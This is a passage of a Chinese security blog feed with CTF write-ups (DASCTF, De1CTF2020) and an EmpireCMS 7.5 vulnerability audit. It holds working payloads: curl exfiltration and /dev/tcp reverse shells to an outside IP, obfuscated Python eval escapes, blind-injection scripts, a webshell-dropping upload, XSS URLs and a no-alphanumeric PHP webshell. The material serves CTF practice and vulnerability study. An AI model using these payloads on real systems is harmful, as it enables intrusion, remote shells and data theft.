class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>只过滤了 <code>or</code> ,因为不是直接回显，所以考虑盲注，但是也可以反弹shell，curl外带</p>
<p>curl外带</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="number">1234</span>|<span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">'cat /flag | curl http://1.1.1.1:2333 --data-binary @-'</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/6月刷题记录/image-20200628174548750.png" alt="image-20200628174548750"></p>
<p>反弹shell</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">1234</span>|<span class="selector-tag">open</span>(<span class="string">'/tmp/c.sh'</span>,<span class="string">'w'</span>)<span class="selector-class">.write</span>(<span class="string">'/bin/bash -i &gt; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1'</span>),<span class="selector-tag">os</span><span class="selector-class">.system</span>(<span class="string">'/bin/bash /tmp/c.sh'</span>)</span><br></pre></td></tr></table></figure>

<p>盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"DASCTF"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">    url = <span class="string">"http://183.129.189.60:10026/"</span></span><br><span class="line">    data=&#123;<span class="string">'input'</span>:<span class="string">'1234|os.system(\'cat /flag|grep &#123;&#125; &amp;&amp; sleep 2\')'</span>.format(payload + i)&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    first = time.time()</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    second = time.time()</span><br><span class="line">    offset = second-first</span><br><span class="line">    <span class="keyword">if</span> offset &gt; <span class="number">2</span>:</span><br><span class="line">        payload = payload+i</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>后面题目下线了，听说是被<code>os.system()</code>打穿了</p>
<h3 id="9-DASCTF-六月赛-简单的计算题2"><a href="#9-DASCTF-六月赛-简单的计算题2" class="headerlink" title="9.[DASCTF 六月赛]简单的计算题2"></a>9.<strong>[DASCTF 六月赛]简单的计算题2</strong></h3><p>其他和1一样，但过滤更严格了</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        input = request.form<span class="literal">['<span class="identifier">input</span>']</span></span><br><span class="line">        create_question = create<span class="literal">()</span></span><br><span class="line">        input_question = session.get('question')</span><br><span class="line">        session<span class="literal">['<span class="identifier">question</span>']</span> = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question<span class="operator"> == </span>None:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"Invalid session please try again!"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"hack"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        calc_str = input_question + <span class="string">"="</span> + str(input)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(calc_str)))</span><br><span class="line">        except Exception <span class="keyword">as</span> ex:</span><br><span class="line">            calc_result = <span class="string">"Invalid"</span></span><br><span class="line">        return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="params">calc_result</span>,<span class="params">question</span>=<span class="params">create_question</span>)</span></span><br></pre></td></tr></table></figure>

<p>后面爬下来的黑名单</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">black_list</span> = [ <span class="string">'os'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'system'</span>,<span class="string">'if'</span>, <span class="string">'for'</span>,<span class="string">'subprocess'</span>, <span class="string">'file'</span>, <span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'enter'</span>,<span class="string">'%'</span>,<span class="string">'or'</span>,<span class="string">'ls'</span>,<span class="string">'sys'</span>,<span class="string">'globals'</span>,<span class="string">'read'</span>,<span class="string">'popen'</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>但 <code>exec</code>没被禁所以和1一样，但 <code>exec</code>返回为空所以用<code>,</code>分割</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"os.system('cat /flag | curl http://1.1.1.1:2333 --data-binary @-')"</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(ord(i))+<span class="string">','</span></span><br><span class="line">print(payload)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(hex(ord(i))).replace(<span class="string">"0x"</span>,<span class="string">""</span>).zfill(<span class="number">2</span>)</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>,exec(<span class="string">'o'</span>+<span class="string">'s.sy'</span>+<span class="string">'stem("sleep 10")'</span>)  <span class="comment">//明显延时了</span></span><br><span class="line"><span class="number">1</span>,exec(bytes([<span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">124</span>, <span class="number">32</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">45</span>, <span class="number">39</span>, <span class="number">41</span>]).decode()) <span class="comment">//curl外带</span></span><br><span class="line"><span class="number">1</span>,exec(bytes.fromhex(<span class="string">'6f732e73797374656d2827636174202f666c6167207c206375726c20687474703a2f2f312e312e312e313a32333333202d2d646174612d62696e61727920402d2729'</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>利用继承链</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">'__cla'</span>+<span class="string">'ss__'</span>),<span class="string">'__mr'</span>+<span class="string">'o__'</span>)[<span class="number">1</span>],<span class="string">'__subclas'</span>+<span class="string">'ses__'</span>)()[<span class="number">104</span>],<span class="string">'__init__'</span>),<span class="string">'__glob'</span>+<span class="string">'al'</span>+<span class="string">'s__'</span>)[<span class="string">'sy'</span>+<span class="string">'s'</span>],<span class="string">'mod'</span>+<span class="string">'ules'</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>],<span class="string">'sy'</span>+<span class="string">'ste'</span>+<span class="string">'m'</span>)(<span class="string">'l'</span>+<span class="string">'s'</span>)//绕waf</span><br></pre></td></tr></table></figure>
</li>
<li><p>字符拼接</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br><span class="line">exec(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br></pre></td></tr></table></figure>


</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>EmpireCMSv7.5代码审计</title>
    <url>/2021/03/EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>环境上没遇到啥问题</p><h3 id="前台XSS"><a href="#前台XSS" class="headerlink" title="前台XSS"></a>前台XSS</h3><ul>
<li><p>漏洞分析</p>
<p>需要开启会员空间</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20212902.png" alt="屏幕截图 2021-03-18 212902"></p>
<p>问题代码在<code>/e/ViewImg/index.html</code> ，Request获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318214012537.png" alt="image-20210318214012537"></p>
<p>跟进<code>Request</code></p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318215455754.png" alt="image-20210318215455754"></p>
<p>通过window.location获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置。</p>
<p>例如,<code>index.html?url=javascript:alert(document.cookie)</code>,经过Request函数处理就变成<code>javascript:alert(document.cookie)</code></p>
<p>url地址经过Request函数处理之后,然后把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值。</p>
<p>所以构造payload：<code>url=javascript:alert(/xss/)</code></p>
</li>
<li><p>漏洞复现</p>
<p>访问<code>http://172.16.43.200:9093/e/ViewImg/index.html?url=javascript:alert(/xss/)</code>,点击图片触发。</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318220355099.png" alt="image-20210318220355099"></p>
</li>
</ul><a id="more"></a>




<h3 id="后台文件上传getshell-CVE-2018-18086"><a href="#后台文件上传getshell-CVE-2018-18086" class="headerlink" title="后台文件上传getshell(CVE-2018-18086 )"></a>后台文件上传getshell(CVE-2018-18086 )</h3><ul>
<li><p>漏洞分析</p>
<p>EmpireCMS  7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的<code>/e/class/moddofun.php</code>的<code>LoadInMod</code>函数存在安全漏洞,未对变量<code>$file</code>做任何处理，直接上传，接着就包含该文件。</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20212415.png" alt="屏幕截图 2021-03-17 212415">        </p>
<p>对此我们直接全局寻找<code>LoadInMod</code>的调用，在<code>e/admin/ecmsmod.php</code></p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220115927.png" alt="image-20210317220115927"></p>
</li>
<li><p>漏洞复现</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20220503.png" alt="屏幕截图 2021-03-17 220503">    </p>
<p>新建一个<code>1.mod</code>的文件，内容为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"../data/getshell.php"</span>,<span class="string">"&lt;?php @eval(\$_POST[a]); ?&gt;"</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>上传成功后，即可得到shell</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220729395.png" alt="image-20210317220729395"></p>
</li>
</ul>
<h3 id="后台SQL执行getshell"><a href="#后台SQL执行getshell" class="headerlink" title="后台SQL执行getshell"></a>后台SQL执行getshell</h3><ul>
<li><p>漏洞分析</p>
<p>漏洞位于<code>e/admin/db/DoSql.php</code> 22行<code>DoExecSql</code>方法</p>
<p><code>$query</code>未经过任何处理就执行了</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20195309.png" alt="屏幕截图 2021-03-18 195309"></p>
<p><code>ClearAddsData</code>方法根据是否开启魔术引号来转义数据，这里我们不用管。跟进<code>RepSqlTbpre</code>方法，只做了前缀替换。</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318200030207.png" alt="image-20210318200030207"></p>
<p>继续跟进<code>DoRunQuery</code>方法，替换<code>\r</code>,按<code>;</code>分割语句，然后就执行语句。</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20200132.png" alt="屏幕截图 2021-03-18 200132"></p>
</li>
<li><p>漏洞利用</p>
<p>可以利用SQL语句写入shell，但利用难度很高。</p>
<p>首先需要开启mysql的<code>secure_file_priv</code> 默认是关闭的，修改my.conf文件, 在[mysqld] 下添加条目: <code>secure_file_priv =</code>,保存之后,然后重启mysql。</p>
<p>之后需要知道网站的绝对路径</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211927366.png" alt="image-20210318211927366"></p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211959712.png" alt="image-20210318211959712"></p>
</li>
</ul>
<p>如果是站库分离影响实在有限。</p>
<h3 id="后台XSS"><a href="#后台XSS" class="headerlink" title="后台XSS"></a>后台XSS</h3><ul>
<li><p>漏洞分析</p>
<p>问题出在<code>e/admin/openpage/AdminPage.php</code>，获取<code>mainfile</code>，<code>leftfile</code>变量后，经过<code>hRepPostStr</code>处理后输出到页面</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319094155021.png" alt="image-20210319094155021"></p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20182718.png" alt="屏幕截图 2021-03-19 182718"></p>
<p>跟进<code>hRepPostStr</code>方法</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20094520.png" alt="屏幕截图 2021-03-19 094520"></p>
<p>跟进<code>ehtmlspecialchars</code>,以<code>ENT_QUOTES</code>模式(既转换双引号也转换单引号)，转义HTML实体</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20181416.png" alt="屏幕截图 2021-03-19 181416"></p>
<p>跟进<code>CkPostStrChar</code>方法，结尾不能为 <code>\\</code>。</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319181832873.png" alt="image-20210319181832873"></p>
<p>最后跟进<code>AddAddsData</code>方法，如果没有开启<code>magic_quotes_gpc</code>函数,就使用<code>addslashes</code>对参数中的特殊字符进行转义处理</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319182058498.png" alt="image-20210319182058498"></p>
</li>
<li><p>漏洞利用</p>
<p>访问<code>http://172.16.43.200:9093/e/admin/openpage/AdminPage.php?ehash_7NYw5=tJmMRJnmeKBHOPaBU04H&amp;mainfile=javascript:alert(document.cookie)</code></p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319183728605.png" alt="image-20210319183728605"></p>
</li>
</ul>
<h3 id="后台任意代码执行"><a href="#后台任意代码执行" class="headerlink" title="后台任意代码执行"></a>后台任意代码执行</h3><ul>
<li><p>漏洞分析</p>
<p><code>e/admin/ebak/phome.php</code>接收备份数据库传递的参数,然后传递给<code>Ebak_DoEbak</code>方法中</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319201938388.png" alt="image-20210319201938388"></p>
<p>跟进<code>Ebak_DoEbak</code>，数据库表名传递给变量<code>$tablename</code></p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20202302.png" alt="屏幕截图 2021-03-19 202302"></p>
<p>再经过<code>RepPostVar</code>处理，替换特殊字符，转义，防火墙过滤(默认上没有过滤字符)</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319203747991.png" alt="image-20210319203747991"></p>
<p>经过字符拼接赋值给<code>$d_table</code>，再拼接进<code>$string</code>最后写入php文件。</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204115.png" alt="屏幕截图 2021-03-19 204115"></p>
</li>
<li><p>漏洞利用</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204313.png" alt="屏幕截图 2021-03-19 204313"></p>
<p>抓包修改<code>tablename</code>字段</p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204718.png" alt="屏幕截图 2021-03-19 204718"></p>
<p>访问<code>config.php</code></p>
<p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319204854229.png" alt="image-20210319204854229"></p>
</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/LEOGG321/p/13882655.html" target="_blank" rel="noopener">https://www.cnblogs.com/LEOGG321/p/13882655.html</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF2020-复现</title>
    <url>/2020/05/De1CTF2020-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="1-check-in"><a href="#1-check-in" class="headerlink" title="1.check in"></a>1.check in</h4><p>题目过滤很多关键字</p><p><img src="/2020/05/De1CTF2020-复现/image-20200507215250934.png" alt="image-20200507215250934"></p><p>首先想到的是上传.htaccess但是把ph给过滤了，后面想上传user.ini 但auto被禁了</p><p>后面看了<a href="https://www.cnblogs.com/20175211lyz/p/11741348.html" target="_blank" rel="noopener">这篇文章</a>利用 换行符”&quot;绕过ph</p><p><img src="/2020/05/De1CTF2020-复现/image-20200507215853923.png" alt="image-20200507215853923"></p><p><img src="/2020/05/De1CTF2020-复现/image-20200507215952735.png" alt="image-20200507215952735"></p><p><img src="/2020/05/De1CTF2020-复现/image-20200507215058705.png" alt="image-20200507215058705"></p><p>但这题的预期解是上传.htaccess</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure><a id="more"></a>









<p> 解析shell脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-Type: text/plain"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line">cat /flag</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>可这题的有坑，官方复现说linux中cgi比较严格，在window下编辑脚本会因为编码问题服务器解析失败，必须在linux环境下编辑脚本再上传。</p>
<p>还有一个非预期是直接上别人的车。。。</p>
<p>上传.htaccess</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> server-status</span><br></pre></td></tr></table></figure>

<p>打开自己的上传就能看到apache的服务器状态，可以看到其他人的访问网站的记录，然后白嫖flag</p>
<p>这应该是后面为啥5分钟重启一次服务的原因吧</p>
<h4 id="2-Mixture"><a href="#2-Mixture" class="headerlink" title="2.Mixture"></a>2.Mixture</h4><p>在member.php的html源码中有orderby注释，应该是sql注入admin的密码</p>
<p>测试过滤的关键字 hex unhex desc exp 还有下面的</p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200507221939844.png" alt="image-20200507221939844"></p>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://134.175.185.244/index.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"xxxxx"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"xxxxxxx"</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: <span class="string">"sou26piclav6f99h79k1l5vmbn"</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data,cookies=cookie)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"http://134.175.185.244/member.php?orderby="</span></span><br><span class="line">sql=<span class="string">'select database()'</span> <span class="comment">#test </span></span><br><span class="line">sql = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><span class="comment">#member,users</span></span><br><span class="line">sql = <span class="string">'select group_concat(column_name) from information_schema.columns where table_schema=database()'</span> <span class="comment">#id, username, password</span></span><br><span class="line">sql = <span class="string">'select password from member'</span> <span class="comment">#18a960a3a0b3554b314ebe77fe545c85</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>:</span><br><span class="line">        payload=<span class="string">"|(mid((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;')%2b1"</span>.format(sql,i,j)</span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> r.content.index(<span class="string">'tom'</span>)&lt;r.content.index(<span class="string">'1000000'</span>):</span><br><span class="line">            <span class="keyword">print</span> payload+<span class="string">' ok'</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> payload</span><br><span class="line"><span class="comment">#18a960a3a0b3554b314ebe77fe545c85</span></span><br></pre></td></tr></table></figure>

<p>跑出来的密码经过md5解密是goodlucktoyou</p>
<p>这里讨论以下其他师傅的payload学习一下</p>
<p>看到排名是是按照ID大小排的，所以猜测后台sql语句应该是</p>
<p><code>select * from users order by id</code> + orderby传参</p>
<p>然后测试</p>
<p>orderby=|2 发现排名变了，这就是关键点了</p>
<p><code>select * from users order by id | 2</code></p>
<p><code>select * from users order by (id | 2)</code></p>
<p>排序是按位或之后排序的举个例子</p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200514204948437.png" alt="image-20200514204948437"></p>
<p>结果中 2|2 最小 排第一 其他不变也就是 2 1 3 4 </p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200514205159803.png" alt="image-20200514205159803"></p>
<p><a href="https://www.gem-love.com/ctf/2302.html" target="_blank" rel="noopener">y1ng</a>师傅用的是时间盲注</p>
<p>核心payload是</p>
<p><code>and case when (FIELD(substr((select database()),0,1),t)=1) then (benchmark(100000,sha1(sha(sha(1)))))end</code></p>
<p>field是mysql的一个自定义排序函数，</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">field</span><span class="params">(value,str1,str2,str3,str4)</span></span></span><br></pre></td></tr></table></figure>

<p>value与str1、str2、str3、str4比较，返回1、2、3、4，如遇到null或者不在列表中的数据则返回0. </p>
<p>利用admin登入后，利用phpinfo的路径信息search功能下载源码</p>
<p>发现select.php 调用了个Minclude</p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200514225953158.png" alt="image-20200514225953158"></p>
<p>接着在phpinfo 发现了Minclude的扩展</p>
<p>找到so扩展目录，下载Mniclude.so</p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200514225752470.png" alt="image-20200514225752470"></p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200514230159673.png" alt="image-20200514230159673"></p>
<p>接下来就不是web狗的事了</p>
<h4 id="3-Hard-Pentest-1"><a href="#3-Hard-Pentest-1" class="headerlink" title="3.Hard_Pentest_1"></a>3.Hard_Pentest_1</h4><p>域渗透太顶了，只能赛后跟着wp内网漫游</p>
<p>文件上传文件名不能包含 <code>..\</code> 文件内容内容不能包含 <code>数字字母;~^&amp;|\反引号</code></p>
<p>这里需要注意的是这是一个window服务器</p>
<p>文件名绕过</p>
<p>1.利用window对于文件和文件名的限制，在以<code>::$DATA</code>字符放在结尾时，不符合操作系统命名规范，在最后生成文件时，字符会被自动删除</p>
<p>2.利用window不区分大小写绕过</p>
<p>文件内容绕过可以参考P神的无数字字母webshell，利用php短标签绕过 <code>;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=@<span class="string">"$_"</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span 